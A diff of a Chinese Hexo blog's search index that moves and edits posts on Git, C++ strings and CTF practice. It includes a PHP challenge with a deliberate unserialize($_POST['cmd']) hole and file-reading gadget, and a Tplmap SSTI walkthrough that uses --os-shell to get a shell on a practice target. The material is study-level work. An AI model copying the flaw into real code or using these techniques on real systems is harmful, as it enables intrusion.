class="string">&quot;ERROR&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当以函数方式调用类时，直接工作输出</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;work(<span class="keyword">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 认证</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="variable">$key</span>) != <span class="string">&quot;8cd80ad332a109f5f6ab764505564c60&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;identify Success!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person_Bean</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p_info_file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方便直接打印类信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;p_info_file);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -1350,29 +1501,6 @@
 ]]></content>
       <tags>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tplmap初体验</title>
-    <url>/2022/04/07/Tplmap%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<h1 id="什么是Tplmap？"><a href="#什么是Tplmap？" class="headerlink" title="什么是Tplmap？"></a>什么是Tplmap？</h1><p>Tplmap是一种SSTI注入工具，类似于与sqlmap，只不过sqlmap适用于sql注入，而tplmap适用于ssti注入</p>
-<h1 id="什么是SSTI？"><a href="#什么是SSTI？" class="headerlink" title="什么是SSTI？"></a>什么是SSTI？</h1><p>这里引用一下大佬的博客，<a href="https://www.jianshu.com/p/b6f1aea3a2eb">点这里</a>。</p>
-<span id="more"></span>
-
-<h1 id="安装Tplmap"><a href="#安装Tplmap" class="headerlink" title="安装Tplmap"></a>安装Tplmap</h1><p><a href="https://blog.csdn.net/weixin_47726676/article/details/115905366">点这里</a>，这里用的是python2，而kali自带的是python3，我试了一下，也可以，只不过这里命令要换成<code>python3 tplmap.py -u &quot;URL/?flag=1&quot;</code>，这里的变量名称不一定是flag，根据题目而定，但是一定要输入变量名。</p>
-<p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">详细使用方法</a></p>
-<h1 id="实战例题"><a href="#实战例题" class="headerlink" title="实战例题"></a>实战例题</h1><p>我用的是最菜的Simple_SSTI_2，首先题目便提示了我们变量名称为flag，所以我们直接执行</p>
-<p><code>python3 tplmap.py -u URL/?flag=1</code></p>
-<p>结果如图</p>
-<p><img src="/2022/04/07/Tplmap%E5%88%9D%E4%BD%93%E9%AA%8C/image-20220407225224144.png" alt="image-20220407225224144"></p>
-<p>然后指定 –os-shell,就可以进入到shell，如图</p>
-<p><img src="/2022/04/07/Tplmap%E5%88%9D%E4%BD%93%E9%AA%8C/image-20220407225459468.png" alt="image-20220407225459468"></p>
-<h1 id="什么是shell？"><a href="#什么是shell？" class="headerlink" title="什么是shell？"></a>什么是shell？</h1><p>简单来说</p>
-<p>Shell 是一个命令解释器，它在操作系统的最外层，负责直接与用户进行对话，把用户的输入解释给<br>操作系统，并处理各种各样的操作系统的输出结果，输出到屏幕反馈给用户。这种对话方式可以是交互式<br>也可以是非交互式的</p>
-<p>详细<a href="http://c.biancheng.net/view/706.html">点这里</a>。</p>
-]]></content>
-      <tags>
-        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -1778,6 +1906,29 @@
       </tags>
   </entry>
   <entry>
+    <title>Tplmap初体验</title>
+    <url>/2022/04/07/Tplmap%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<h1 id="什么是Tplmap？"><a href="#什么是Tplmap？" class="headerlink" title="什么是Tplmap？"></a>什么是Tplmap？</h1><p>Tplmap是一种SSTI注入工具，类似于与sqlmap，只不过sqlmap适用于sql注入，而tplmap适用于ssti注入</p>
+<h1 id="什么是SSTI？"><a href="#什么是SSTI？" class="headerlink" title="什么是SSTI？"></a>什么是SSTI？</h1><p>这里引用一下大佬的博客，<a href="https://www.jianshu.com/p/b6f1aea3a2eb">点这里</a>。</p>
+<span id="more"></span>
+
+<h1 id="安装Tplmap"><a href="#安装Tplmap" class="headerlink" title="安装Tplmap"></a>安装Tplmap</h1><p><a href="https://blog.csdn.net/weixin_47726676/article/details/115905366">点这里</a>，这里用的是python2，而kali自带的是python3，我试了一下，也可以，只不过这里命令要换成<code>python3 tplmap.py -u &quot;URL/?flag=1&quot;</code>，这里的变量名称不一定是flag，根据题目而定，但是一定要输入变量名。</p>
+<p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">详细使用方法</a></p>
+<h1 id="实战例题"><a href="#实战例题" class="headerlink" title="实战例题"></a>实战例题</h1><p>我用的是最菜的Simple_SSTI_2，首先题目便提示了我们变量名称为flag，所以我们直接执行</p>
+<p><code>python3 tplmap.py -u URL/?flag=1</code></p>
+<p>结果如图</p>
+<p><img src="/2022/04/07/Tplmap%E5%88%9D%E4%BD%93%E9%AA%8C/image-20220407225224144.png" alt="image-20220407225224144"></p>
+<p>然后指定 –os-shell,就可以进入到shell，如图</p>
+<p><img src="/2022/04/07/Tplmap%E5%88%9D%E4%BD%93%E9%AA%8C/image-20220407225459468.png" alt="image-20220407225459468"></p>
+<h1 id="什么是shell？"><a href="#什么是shell？" class="headerlink" title="什么是shell？"></a>什么是shell？</h1><p>简单来说</p>
+<p>Shell 是一个命令解释器，它在操作系统的最外层，负责直接与用户进行对话，把用户的输入解释给<br>操作系统，并处理各种各样的操作系统的输出结果，输出到屏幕反馈给用户。这种对话方式可以是交互式<br>也可以是非交互式的</p>
+<p>详细<a href="http://c.biancheng.net/view/706.html">点这里</a>。</p>
+]]></content>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Win7搭建sqlilabs</title>
     <url>/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/</url>
     <content><![CDATA[<h1 id="下载sqli-labs"><a href="#下载sqli-labs" class="headerlink" title="下载sqli-labs"></a>下载sqli-labs</h1><p><a href="https://github.com/Audi-1/sqli-labs">点击此处下载</a>sqli-labs</p>
@@ -1973,105 +2124,12 @@
 <p>string是C++标准库头文件，包含了拟容器class std::string的声明（不过class string事实上只是basic_string char的typedef），用于字符串操作。<br>cstring是C标准库头文件string.h的C++标准库版本，包含了C风格字符串（NUL即’\0’结尾字符串）相关的一些类型和函数的声明，例如strcmp、strchr、strstr等。cstring和string.h的最大区别在于，其中声明的名称都是位于std命名空间中的，而不是后者的全局命名空间。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span><span class="comment">//for strcmp(),strcpy(),strcat(),strlen().</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s1[<span class="number">10</span>] = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> s2[<span class="number">10</span>] = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="built_in">strcmp</span>(s1, s2) &lt;&lt; endl;<span class="comment">//string compare: 1-大于, -1-小于, 0-等于</span></span><br><span class="line">	cout &lt;&lt; <span class="built_in">strcmp</span>(s1, <span class="string">&quot;abc&quot;</span>) &lt;&lt; endl; </span><br><span class="line">	cout &lt;&lt; <span class="built_in">strcmp</span>(s1, <span class="string">&quot;abd&quot;</span>) &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;-----&quot;</span> &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;s1 = &quot;</span> &lt;&lt; s1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;s2 = &quot;</span> &lt;&lt; s2 &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">strcpy</span>(s1, s2);<span class="comment">//string copy, 字符串复制 </span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;s1 = &quot;</span> &lt;&lt; s1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;s2 = &quot;</span> &lt;&lt; s2 &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">strcat</span>(s1, s2);<span class="comment">//string catenate, 字符串连接</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;s1 = &quot;</span> &lt;&lt; s1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;s2 = &quot;</span> &lt;&lt; s2 &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt;<span class="built_in">strlen</span>(s1) &lt;&lt;endl;<span class="comment">//s1的有效字符长度</span></span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>这里有必要区别一下反应数组长度的几个函数：</p>
+<p>其中str.length()和str.size()是同义词，返回同样的值。</p>
+<p>strlen(str)是用于求字符数组的长度，其参数是char。</p>
 ]]></content>
       <tags>
         <tag>C++</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git的介绍、安装和基本提交</title>
-    <url>/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/</url>
-    <content><![CDATA[<h1 id="Git的优势"><a href="#Git的优势" class="headerlink" title="Git的优势"></a>Git的优势</h1><ul>
-<li><p>大部分操作在本地完成，不需要连接互联网</p>
-</li>
-<li><p>完整性保证（利用Hash值）</p>
-</li>
-<li><p>尽可能添加数据而不是删除数据或修改数据，从而避免了不可逆操作（为每个版本拍摄快照）</p>
-</li>
-<li><p>分支操作非常快捷流畅</p>
-</li>
-<li><p>与Linux命令全面兼容（二者是一个爹）</p>
-<span id="more"></span></li>
-</ul>
-<h1 id="Git的安装"><a href="#Git的安装" class="headerlink" title="Git的安装"></a>Git的安装</h1><p>首先去<a href="https://git-scm.com/download/win">git官网下载</a>并根据自己电脑的位数选择相应的版本</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108191953930.png" alt="image-20220108191953930"></p>
-<p>下载完成后安装，选择一个非中文没有空格的目录</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192101316.png" alt="image-20220108192101316"></p>
-<p>然后下一步，按照下面图片的选项即可</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192700075.png" alt="image-20220108192700075"></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192807726.png" alt="image-20220108192807726"></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192853679.png" alt="image-20220108192853679"></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193229371.png" alt="image-20220108193229371"></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193435463.png" alt="image-20220108193435463"></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193801302.png" alt="image-20220108193801302"></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193945547.png" alt="image-20220108193945547"></p>
-<p>然后安装即可，装完效果如下</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194259961.png" alt="image-20220108194259961"></p>
-<h1 id="Git在本地的结构"><a href="#Git在本地的结构" class="headerlink" title="Git在本地的结构"></a>Git在本地的结构</h1><p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194609170.png" alt="image-20220108194609170"></p>
-<h1 id="Git和代码托管中心"><a href="#Git和代码托管中心" class="headerlink" title="Git和代码托管中心"></a>Git和代码托管中心</h1><p>代码托管中心有很多，如外网环境下的GitHub、码云，局域网里的GitLab服务器（Git和Github的历史发展没有渊源）代码托管中心的任务是维护远程库</p>
-<h1 id="Git的本地库和远程库的交互"><a href="#Git的本地库和远程库的交互" class="headerlink" title="Git的本地库和远程库的交互"></a>Git的本地库和远程库的交互</h1><p>团队内协作（不加入团队不可push修改远程库代码）</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108202115421.png" alt="image-20220108202115421"></p>
-<p>跨团队协作</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108211729222.png" alt="image-20220108211729222"></p>
-<h1 id="Git命令行操作"><a href="#Git命令行操作" class="headerlink" title="Git命令行操作"></a>Git命令行操作</h1><h2 id="本地库操作"><a href="#本地库操作" class="headerlink" title="本地库操作"></a>本地库操作</h2><h3 id="本地库初始化"><a href="#本地库初始化" class="headerlink" title="本地库初始化"></a>本地库初始化</h3><p>命令：<code>git init</code></p>
-<p>效果：<img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108212311272.png" alt="image-20220108212311272"></p>
-<p>注意：.git目录中存放的是本地库相关的子目录和文件，不要删除和修改</p>
-<h3 id="设置签名"><a href="#设置签名" class="headerlink" title="设置签名"></a>设置签名</h3><p>形式：</p>
-<p>用户名：随便输</p>
-<p>Email地址：随便输，不存在也没关系</p>
-<p>作用：区分不同开发人员</p>
-<p>辨析：这里设置的签名和远程库（代码托管中心）的账号和密码一点关系没有</p>
-<p>命令：<code>git config user.name 用户名</code>  </p>
-<p>​        ：<code>git config user.email 邮件地址</code>    项目级别</p>
-<p>​        ：<code>git config --global user.name 用户名</code></p>
-<p>​         :  <code>git config --global user.email 邮件地址</code>    系统用户级别</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108214655319.png" alt="image-20220108214655319"></p>
-<p>项目级别/仓库级别：仅在当前本地库范围内有效（即只在test文件夹内有效）</p>
-<p>系统用户级别：登录当前操作系统的用户范围，如图</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108213618080.png" alt="image-20220108213618080"></p>
-<p>若没设置，则默认是系统用户级别，若两个都有，则是项目级别。也就是项目级别优先于系统用户级别。</p>
-<p>若二者都没有是不允许的</p>
-<p>项目级别用户名和邮件地址保存在.git/config里面，如上图</p>
-<p>系统用户级别用户名和邮件地址保存在当前用户文件夹里，如图</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108215432512.png" alt="image-20220108215432512"></p>
-<p>通常只设置一个系统用户级别</p>
-<h3 id="添加提交和查看状态操作"><a href="#添加提交和查看状态操作" class="headerlink" title="添加提交和查看状态操作"></a>添加提交和查看状态操作</h3><p>查看当前库状态命令：<code>git status</code></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220013324.png" alt="image-20220108220013324"></p>
-<p>创建文件命令：<code>vim 文件名.文件类型</code>（创建后即使未提交，在windows文件夹中也可看到该文件）</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220229743.png" alt="image-20220108220229743"></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220240175.png" alt="image-20220108220240175"></p>
-<p>按I键开始输入内容</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220517621.png" alt="image-20220108220517621"></p>
-<p>编辑完成后按ESC然后输入<code>:wq</code>退出</p>
-<p>此时再输入<code>git status</code>可看到</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
-<p>将工作区文件放入暂存区命令：<code>git add 文件名.文件类型</code></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221653353.png" alt="image-20220108221653353"></p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
-<p>放进去后，在用<code>git status</code>看一下状态，可知test.txt已经进入暂存区</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222245958.png" alt="image-20220108222245958"></p>
-<p>若使用<code>git rm --cached test.txt</code>则又回到此状态</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
-<p>将暂存区文件提交到本地库命令：<code>git commit 文件名.文件类型</code></p>
-<p>vim编辑器中输入<code>:set nu</code>来查看行号</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222950393.png" alt="image-20220108222950393"></p>
-<p>然后按I键来进行输入更改备注信息</p>
-<p>输入好后按ESC然后输入<code>:wq</code>退出</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223450538.png" alt="image-20220108223450538"></p>
-<p>然后再看一下状态</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223535612.png" alt="image-20220108223535612"></p>
-<p>利用<code>git commit --amend - “新的备注”</code>来更改备注信息，并用<code>git log</code>来查看历史版本</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224049105.png" alt="image-20220108224049105"></p>
-<p>用<code>vim test.txt</code>继续编辑文件，加入一行“d”然后再查看状态</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224800559.png" alt="image-20220108224800559"></p>
-<p>这里用<code>git add test.txt</code>按部就班的进行提交，然后查看状态</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225112194.png" alt="image-20220108225112194"></p>
-<p>然后进行提交，这里用<code>git commit -m &quot;备注&quot; test.txt</code>进行提交，不用再在vim编辑器里输入备注信息</p>
-<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225410302.png" alt="image-20220108225410302"></p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
       </tags>
   </entry>
   <entry>
@@ -2178,31 +2236,96 @@
       </tags>
   </entry>
   <entry>
-    <title>scrabble的使用</title>
-    <url>/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="scrabble介绍"><a href="#scrabble介绍" class="headerlink" title="scrabble介绍"></a>scrabble介绍</h1><p>scrabble适用常规的git泄露，用于获取源码。开发人员忘记.git文件，导致攻击者可以通过.git文件夹中的信息获取开发人员所提交过的源码。</p>
-<p>安装：<code>git clone https://github.com/denny0223/scrabble</code>(用在linux系统中)</p>
-<span id="more"></span>
-
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143040320.png" alt="image-20220128143040320"></p>
-<p>有时候获取不到，多试几次，毕竟github有时候进不去，呜呜呜。</p>
-<h1 id="测试环境的搭建"><a href="#测试环境的搭建" class="headerlink" title="测试环境的搭建"></a>测试环境的搭建</h1><p>这里用Ubuntu和PHPstudy示范</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143248746.png" alt="image-20220128143248746"></p>
-<p>进入根目录后，创建test测试文件</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143340203.png" alt="image-20220128143340203"></p>
-<p>若出现如下情况，直接用命令行进入管理员模式访问吧。</p>
-<p>进入管理员模式：<code>su root</code>，然后输入密码即可，注意，密码输入后是不会显示的。</p>
-<p>然后切换到目的文件夹</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143610379.png" alt="image-20220128143610379"></p>
-<p>这里我已经创建了几个文档和一个文件夹，文档的创建过程见Git教程，文件夹的创建<code>mkdir 文件夹名</code></p>
-<p>所以，这里我们的测试网址应该是<code>http://127.0.0.1/test</code>。</p>
-<p>顺便补充一下，我这里还搭建了sqli-labs靶场，虚拟机内访问是<code>http://127.0.0.1/sqli-labs</code>，物理机访问是要把127.0.0.1换成虚拟机的IP v4地址。查看方法如下</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144009957.png" alt="image-20220128144009957"></p>
-<h1 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h1><p>按照图中的指令即可</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144150492.png" alt="image-20220128144150492"></p>
-<p>注意，这里用完后，原来scrabble文件夹中的内容就被目标网站中的源码取代了，所以建议备份scrabble源文件，要不还得git clone一下。获取后直接cat查看就可以了。但是我试了一下，这里并不能获得sqli-labs的源文件，目测是因为sqli-labs中.git文件夹中的信息不太友好，本地对其并没有操作。所以也就没有git提交记录。</p>
-<p><strong>还有一种情况是，flag会藏在老版本里，所以我们用scrabble获取源码后。输入<code>git log</code>查看以前版本，并切换，从而找到flag</strong></p>
-<p>再补充一下，<code>git reflog</code>版本信息更全，能够看更先进的版本（如果有的话）。而<code>git log</code>只能看老版本</p>
+    <title>Git的介绍、安装和基本提交</title>
+    <url>/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/</url>
+    <content><![CDATA[<h1 id="Git的优势"><a href="#Git的优势" class="headerlink" title="Git的优势"></a>Git的优势</h1><ul>
+<li><p>大部分操作在本地完成，不需要连接互联网</p>
+</li>
+<li><p>完整性保证（利用Hash值）</p>
+</li>
+<li><p>尽可能添加数据而不是删除数据或修改数据，从而避免了不可逆操作（为每个版本拍摄快照）</p>
+</li>
+<li><p>分支操作非常快捷流畅</p>
+</li>
+<li><p>与Linux命令全面兼容（二者是一个爹）</p>
+<span id="more"></span></li>
+</ul>
+<h1 id="Git的安装"><a href="#Git的安装" class="headerlink" title="Git的安装"></a>Git的安装</h1><p>首先去<a href="https://git-scm.com/download/win">git官网下载</a>并根据自己电脑的位数选择相应的版本</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108191953930.png" alt="image-20220108191953930"></p>
+<p>下载完成后安装，选择一个非中文没有空格的目录</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192101316.png" alt="image-20220108192101316"></p>
+<p>然后下一步，按照下面图片的选项即可</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192700075.png" alt="image-20220108192700075"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192807726.png" alt="image-20220108192807726"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192853679.png" alt="image-20220108192853679"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193229371.png" alt="image-20220108193229371"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193435463.png" alt="image-20220108193435463"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193801302.png" alt="image-20220108193801302"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193945547.png" alt="image-20220108193945547"></p>
+<p>然后安装即可，装完效果如下</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194259961.png" alt="image-20220108194259961"></p>
+<h1 id="Git在本地的结构"><a href="#Git在本地的结构" class="headerlink" title="Git在本地的结构"></a>Git在本地的结构</h1><p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194609170.png" alt="image-20220108194609170"></p>
+<h1 id="Git和代码托管中心"><a href="#Git和代码托管中心" class="headerlink" title="Git和代码托管中心"></a>Git和代码托管中心</h1><p>代码托管中心有很多，如外网环境下的GitHub、码云，局域网里的GitLab服务器（Git和Github的历史发展没有渊源）代码托管中心的任务是维护远程库</p>
